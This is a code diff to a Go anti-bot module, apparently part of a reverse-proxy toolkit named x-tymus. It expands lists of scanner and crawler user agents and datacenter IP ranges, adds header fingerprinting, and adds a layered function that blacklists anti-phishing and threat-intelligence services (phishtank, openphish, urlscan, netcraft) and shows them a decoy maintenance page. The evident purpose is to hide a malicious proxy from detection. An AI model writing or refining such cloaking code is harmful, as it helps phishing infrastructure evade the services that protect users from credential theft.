@@ -11,10 +11,10 @@ import (
 	"github.com/x-tymus/x-tymus/log"
 )
 
-// knownScannerUA contains exact substrings that ONLY appear in automated
-// security scanners, threat-intel crawlers, or headless browsers — never in
-// a real user's browser. Every entry here was verified to not appear in any
-// legitimate browser UA string.
+// ─────────────────────────────────────────────────────────────────────────────
+// Layer 1 — Known scanner / crawler User-Agent substrings
+// These strings NEVER appear in any real browser UA string.
+// ─────────────────────────────────────────────────────────────────────────────
 var knownScannerUA = []string{
 	// Security / threat intelligence platforms
 	"urlscan", "censys", "shodan", "shadowserver", "securitytrails",
@@ -25,166 +25,122 @@ var knownScannerUA = []string{
 	"spyse", "leakix", "pulsedive", "threatminer",
 	"alienvault", "phishtank", "openphish", "netcraft",
 	"ipqualityscore", "fraudguard", "spur.us",
-	"cloudflare-radar",
+	"cloudflare-radar", "internet-measurement",
+	"expanse", "intrigue", "rapid7", "tenable",
+	"criminalip", "webscout", "hunter.io",
+	"sikker", "cybergreen", "threatbook",
+	"stretchoid", "rwth-aachen", "dnsdb",
 
-	// Automation frameworks — these strings never appear in real browsers
+	// Automation / HTTP libraries — never seen in browser UAs
 	"python-requests", "python-urllib", "python-httpx",
-	"libwww-perl", "lwp-request",
-	"go-http-client",
-	"httpie",
-	"scrapy",
-	"aiohttp",
-	"pycurl",
-	"mechanize",
-	"guzzle/",
-	"rest-client",
+	"python/", "libwww-perl", "lwp-request",
+	"go-http-client", "go http package",
+	"httpie", "scrapy", "aiohttp", "pycurl",
+	"mechanize", "guzzle/", "rest-client",
+	"java/", "jakarta commons", "apache-httpclient",
+	"axios/", "node-fetch", "node.js",
+	"okhttp/", "feign/", "jersey/",
+	"curl/", "wget/", "libcurl",
+	"ruby", "perl/", "php/",
+	"dart:", "undici/",
 
-	// Headless browser indicators — only appear when DevTools is driving
-	"phantomjs",
-	"headlesschrome",
-	"headless chrome",
-	"puppeteer",
-	"playwright",
-	"selenium",
-	"webdriver",
-	"htmlunit",
+	// Headless browser indicators — only in automated/devtools context
+	"phantomjs", "headlesschrome", "headless chrome",
+	"puppeteer", "playwright", "selenium",
+	"webdriver", "htmlunit", "slimerjs",
+	"zombie.js", "jsdom", "cypress",
+	"testcafe", "nightmare", "casperjs",
+	"wkhtmlto", "chromium headless",
 
-	// Named search engine / social crawlers
-	"googlebot",
-	"bingbot",
-	"baiduspider",
-	"yandexbot",
-	"duckduckbot",
-	"slurp",
-	"applebot",
-	"facebookexternalhit",
-	"facebot",
-	"twitterbot",
-	"linkedinbot",
-	"discordbot",
-	"telegrambot",
-	"whatsapp",
-	"slackbot",
-	"slack-imgproxy",
-	"iframely",
-	"embedly",
-	"preview",
-	"prerender",
-	"semrushbot",
-	"ahrefsbot",
-	"mj12bot",
-	"dotbot",
-	"rogerbot",
-	"exabot",
-	"blexbot",
-	"mojeekbot",
-	"petalbot",
-	"bytespider",
-	"claudebot",
-	"gptbot",
-	"perplexitybot",
-	"anthropic-ai",
-	"dataforseo",
-	"pinterestbot",
-	"ia_archiver",
-	// Link preview / URL unfurling services
-	"xing-contenttabreceiver",
-	"bitrix link preview",
-	"vkshare",
-	"w3c_validator",
-	"curl/",
-	"wget/",
+	// Search engine crawlers
+	"googlebot", "google-read-aloud", "google-inspectiontool",
+	"adsbot-google", "mediapartners-google", "feedfetcher-google",
+	"bingbot", "msnbot", "baiduspider",
+	"yandexbot", "yandex/", "duckduckbot",
+	"slurp", "applebot", "exabot",
+	"facebookexternalhit", "facebot",
+	"twitterbot", "linkedinbot",
+	"discordbot", "telegrambot",
+	"whatsapp", "slackbot", "slack-imgproxy",
+	"iframely", "embedly", "prerender",
+	"semrushbot", "ahrefsbot", "mj12bot",
+	"dotbot", "rogerbot", "blexbot",
+	"mojeekbot", "petalbot", "bytespider",
+	"claudebot", "gptbot", "perplexitybot",
+	"anthropic-ai", "dataforseo",
+	"pinterestbot", "ia_archiver",
+	"archive.org", "archive.org_bot",
+	"sogou", "360spider",
+	"xing-contenttabreceiver", "vkshare",
+	"w3c_validator", "w3c-checklink",
+	"netcraftsurveyagent", "wc3linkchecker",
+	"pandalytics", "seokicks",
+	"brandwatch", "mention.com",
+	"trendiction", "socialdog",
+	"scoutjet", "gigabot",
+
+	// Generic scan / vuln scanner strings
+	"nmap", "openvas", "acunetix", "netsparker",
+	"burpsuite", "burp ", "appscan",
+	"dirbuster", "gobuster", "feroxbuster",
+	"sqlmap", "wfuzz", "ffuf",
+	"metasploit", "hydra", "medusa",
 }
 
-// knownScannerCIDRs are static IP ranges exclusively used by well-known
-// security scanners. Only add ranges that are 100% scanner-owned.
+// ─────────────────────────────────────────────────────────────────────────────
+// Layer 2 — Known scanner-owned IP ranges (100% datacenter / scanner-only)
+// ─────────────────────────────────────────────────────────────────────────────
 var knownScannerCIDRs = []string{
 	// Censys
-	"162.142.125.0/24",
-	"167.248.133.0/24",
+	"162.142.125.0/24", "167.248.133.0/24",
 	// Shodan
-	"198.20.69.0/24",
-	"198.20.70.0/24",
-	"198.20.99.0/24",
-	"198.20.100.0/24",
+	"198.20.69.0/24", "198.20.70.0/24", "198.20.99.0/24", "198.20.100.0/24",
 	// Shadowserver
-	"184.105.139.0/24",
-	"184.105.143.0/24",
-	"184.105.247.0/24",
-	"74.82.47.0/24",
+	"184.105.139.0/24", "184.105.143.0/24", "184.105.247.0/24", "74.82.47.0/24",
 	// BinaryEdge
-	"179.61.251.0/24",
-	"185.198.134.0/24",
-	// IPVoid
-	"80.82.77.0/24",
-	"80.82.78.0/24",
-	// Telegram servers (link preview fetcher)
-	"149.154.160.0/20",
-	"91.108.4.0/22",
-	"91.108.8.0/22",
-	"91.108.56.0/22",
-	"91.108.56.0/23",
-	// Facebook link preview
-	"69.63.176.0/20",
-	"66.220.144.0/20",
-	"31.13.24.0/21",
+	"179.61.251.0/24", "185.198.134.0/24",
+	// IPVoid / threat scanners
+	"80.82.77.0/24", "80.82.78.0/24",
+	// Intrinsec / Onyphe
+	"213.32.252.0/24",
+	// Project Sonar / Rapid7
+	"71.6.232.0/24",
+	// Stretchoid
+	"65.49.1.0/24",
+	// Telegram link preview servers
+	"149.154.160.0/20", "91.108.4.0/22", "91.108.8.0/22", "91.108.56.0/22",
+	// Facebook crawlers
+	"69.63.176.0/20", "66.220.144.0/20", "31.13.24.0/21",
 	// Slack link unfurling
-	"54.172.0.0/16",
-	"107.23.0.0/16",
-	// Psychz Networks (datacenter/scanner hosting)
-	"107.172.0.0/16",
-	"107.173.0.0/16",
-	"107.174.0.0/16",
+	"54.172.0.0/16", "107.23.0.0/16",
+	// Psychz Networks (scanner hosting)
+	"107.172.0.0/16", "107.173.0.0/16", "107.174.0.0/16",
 	// OVH datacenter
-	"51.75.0.0/16",
-	"51.81.0.0/16",
-	"51.89.0.0/16",
-	"51.91.0.0/16",
-	"54.36.0.0/16",
-	"54.38.0.0/16",
-	"104.252.0.0/16",
+	"51.75.0.0/16", "51.81.0.0/16", "51.89.0.0/16", "51.91.0.0/16",
+	"54.36.0.0/16", "54.38.0.0/16", "104.252.0.0/16",
 	// Vultr
-	"45.32.0.0/16",
-	"45.63.0.0/16",
-	"45.76.0.0/16",
-	"45.77.0.0/16",
-	"104.207.0.0/16",
-	"108.61.0.0/16",
+	"45.32.0.0/16", "45.63.0.0/16", "45.76.0.0/16", "45.77.0.0/16",
+	"104.207.0.0/16", "108.61.0.0/16",
 	// DigitalOcean
-	"104.131.0.0/16",
-	"104.236.0.0/16",
-	"138.197.0.0/16",
-	"139.59.0.0/16",
-	"159.65.0.0/16",
-	"159.89.0.0/16",
-	"167.99.0.0/16",
-	"174.138.0.0/16",
-	// Linode/Akamai
-	"45.33.0.0/16",
-	"45.56.0.0/16",
-	"45.79.0.0/16",
-	"69.164.192.0/18",
-	"72.14.176.0/20",
+	"104.131.0.0/16", "104.236.0.0/16", "138.197.0.0/16", "139.59.0.0/16",
+	"159.65.0.0/16", "159.89.0.0/16", "167.99.0.0/16", "174.138.0.0/16",
+	// Linode / Akamai
+	"45.33.0.0/16", "45.56.0.0/16", "45.79.0.0/16", "69.164.192.0/18",
 	// Hetzner
-	"5.9.0.0/16",
-	"78.46.0.0/15",
-	"88.198.0.0/16",
-	"95.216.0.0/16",
-	"116.202.0.0/16",
-	"135.181.0.0/16",
-	"138.201.0.0/16",
-	"157.90.0.0/16",
-	"176.9.0.0/16",
-	"178.63.0.0/16",
-	// AWS common scanner ranges
-	"18.232.0.0/16",
-	"18.234.0.0/16",
-	"18.235.0.0/16",
-	"34.224.0.0/12",
-	"52.0.0.0/11",
+	"5.9.0.0/16", "78.46.0.0/15", "88.198.0.0/16", "95.216.0.0/16",
+	"116.202.0.0/16", "135.181.0.0/16", "138.201.0.0/16", "157.90.0.0/16",
+	"176.9.0.0/16", "178.63.0.0/16",
+	// AWS scanner ranges
+	"18.232.0.0/16", "18.234.0.0/16", "18.235.0.0/16",
+	"34.224.0.0/12", "52.0.0.0/11",
 	// Contabo
-	"195.201.0.0/16",
-	"213.136.0.0/16",
+	"195.201.0.0/16", "213.136.0.0/16",
+	// LeaseWeb
+	"85.17.0.0/16", "192.161.0.0/16",
+	// Serverius
+	"185.107.80.0/22",
+	// Scaleway
+	"51.15.0.0/16", "212.47.0.0/16",
 }
 
 var scannerNets []*net.IPNet
@@ -198,9 +154,49 @@ func init() {
 	}
 }
 
-// IsKnownBot returns true only when the UA matches a precise scanner/crawler
-// signature. Real browser UAs (Chrome, Firefox, Safari, Edge, mobile) never
-// contain any of the strings in knownScannerUA.
+// ─────────────────────────────────────────────────────────────────────────────
+// Layer 3 — Positive browser fingerprinting
+// Real browsers always send these headers. Automated tools often skip them.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// isMissingBrowserHeaders returns true when the request is missing headers that
+// every real browser sends on HTTPS pages. Scanners/curl/scrapers skip these.
+func isMissingBrowserHeaders(req *http.Request) bool {
+	// All real browsers send Accept-Language
+	if req.Header.Get("Accept-Language") == "" {
+		return true
+	}
+	// All real browsers send Accept-Encoding
+	if req.Header.Get("Accept-Encoding") == "" {
+		return true
+	}
+	// All real browsers send Accept
+	if req.Header.Get("Accept") == "" {
+		return true
+	}
+	return false
+}
+
+// isSuspiciousAccept returns true when the Accept header looks like a non-browser.
+// Real browsers send complex Accept headers; raw HTTP clients send "*/*" or nothing.
+func isSuspiciousAccept(req *http.Request) bool {
+	accept := req.Header.Get("Accept")
+	if accept == "" {
+		return true
+	}
+	// Only "*/*" with nothing else is a strong bot signal
+	stripped := strings.TrimSpace(accept)
+	if stripped == "*/*" {
+		return true
+	}
+	return false
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Public detection functions
+// ─────────────────────────────────────────────────────────────────────────────
+
+// IsKnownBot returns true when the UA matches a scanner/crawler signature.
 func IsKnownBot(ua string) bool {
 	lower := strings.ToLower(ua)
 	for _, sig := range knownScannerUA {
@@ -211,7 +207,7 @@ func IsKnownBot(ua string) bool {
 	return false
 }
 
-// IsKnownScannerIP returns true only for IPs in confirmed scanner-only CIDRs.
+// IsKnownScannerIP returns true for IPs in confirmed scanner-only CIDRs.
 func IsKnownScannerIP(ip string) bool {
 	parsed := net.ParseIP(ip)
 	if parsed == nil {
@@ -225,8 +221,7 @@ func IsKnownScannerIP(ip string) bool {
 	return false
 }
 
-// AddScannerCIDR permanently blocks a subnet. Use manually — NOT called
-// automatically per-visit to avoid wiping legitimate ISP ranges.
+// AddScannerCIDR permanently blocks a subnet in the blacklist file.
 func AddScannerCIDR(cidr string) {
 	if GlobalBlacklist == nil || GlobalBlacklist.configPath == "" {
 		return
@@ -251,8 +246,60 @@ func AddScannerCIDR(cidr string) {
 	log.Warning("antibot: blocked scanner subnet %s", cidr)
 }
 
-// decoyHTML is served to scanners — a plain 200 OK maintenance page with no
-// redirect chain, no suspicious headers. Nothing for a scanner to flag.
+// ─────────────────────────────────────────────────────────────────────────────
+// CheckAndBlockBot — runs all detection layers in order.
+// Returns (true, req, resp) when a bot is detected; caller should return resp.
+// ─────────────────────────────────────────────────────────────────────────────
+func CheckAndBlockBot(req *http.Request, from_ip string, bl *Blacklist) (bool, *http.Request, *http.Response) {
+	ua := req.UserAgent()
+
+	// ── Layer 1: Empty UA ────────────────────────────────────────────────────
+	if strings.TrimSpace(ua) == "" {
+		log.Warning("antibot: empty UA from %s — blocked", from_ip)
+		bl.AddIP(from_ip)
+		rq, rs := DecoyResponse(req)
+		return true, rq, rs
+	}
+
+	// ── Layer 2: UA blocklist ────────────────────────────────────────────────
+	if IsKnownBot(ua) {
+		log.Warning("antibot: known bot UA=%q IP=%s — blocked", ua, from_ip)
+		bl.AddIP(from_ip)
+		rq, rs := DecoyResponse(req)
+		return true, rq, rs
+	}
+
+	// ── Layer 3: Scanner IP ranges ───────────────────────────────────────────
+	if IsKnownScannerIP(from_ip) {
+		log.Warning("antibot: scanner IP=%s UA=%q — blocked", from_ip, ua)
+		bl.AddIP(from_ip)
+		rq, rs := DecoyResponse(req)
+		return true, rq, rs
+	}
+
+	// ── Layer 4: Missing browser headers ────────────────────────────────────
+	if isMissingBrowserHeaders(req) {
+		log.Warning("antibot: missing browser headers IP=%s UA=%q — blocked", from_ip, ua)
+		bl.AddIP(from_ip)
+		rq, rs := DecoyResponse(req)
+		return true, rq, rs
+	}
+
+	// ── Layer 5: Bare "*/*" Accept header (raw HTTP client) ─────────────────
+	if isSuspiciousAccept(req) {
+		log.Warning("antibot: suspicious Accept header IP=%s UA=%q — blocked", from_ip, ua)
+		bl.AddIP(from_ip)
+		rq, rs := DecoyResponse(req)
+		return true, rq, rs
+	}
+
+	return false, nil, nil
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Decoy response — maintenance page. No redirect, no suspicious headers.
+// Scanners record this as a normal site under maintenance.
+// ─────────────────────────────────────────────────────────────────────────────
 const decoyHTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -283,8 +330,6 @@ const decoyHTML = `<!DOCTYPE html>
 </body>
 </html>`
 
-// DecoyResponse returns a clean HTTP 200 maintenance page. No redirect, no
-// suspicious response headers — scanners record this as a normal site.
 func DecoyResponse(req *http.Request) (*http.Request, *http.Response) {
 	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, decoyHTML)
 	if resp != nil {
@@ -292,33 +337,4 @@ func DecoyResponse(req *http.Request) (*http.Request, *http.Response) {
 		resp.Header.Set("X-Content-Type-Options", "nosniff")
 	}
 	return req, resp
-}
-
-// CheckAndBlockBot checks for scanner signals. If detected, blacklists the
-// individual IP (NOT the /24 — too aggressive for shared ISP ranges) and
-// returns a decoy response.
-func CheckAndBlockBot(req *http.Request, from_ip string, bl *Blacklist) (bool, *http.Request, *http.Response) {
-	ua := req.UserAgent()
-
-	// Empty UA is a strong bot signal — real browsers always send one.
-	emptyUA := strings.TrimSpace(ua) == ""
-
-	isBot := emptyUA || IsKnownBot(ua) || IsKnownScannerIP(from_ip)
-	if !isBot {
-		return false, nil, nil
-	}
-
-	if emptyUA {
-		log.Warning("antibot: empty user-agent from %s — blacklisting", from_ip)
-	} else {
-		log.Warning("antibot: scanner detected UA=%q IP=%s — blacklisting", ua, from_ip)
-	}
-
-	// Block just the single IP, not the whole subnet.
-	if bl != nil {
-		_ = bl.AddIP(from_ip)
-	}
-
-	rq, rs := DecoyResponse(req)
-	return true, rq, rs
 }
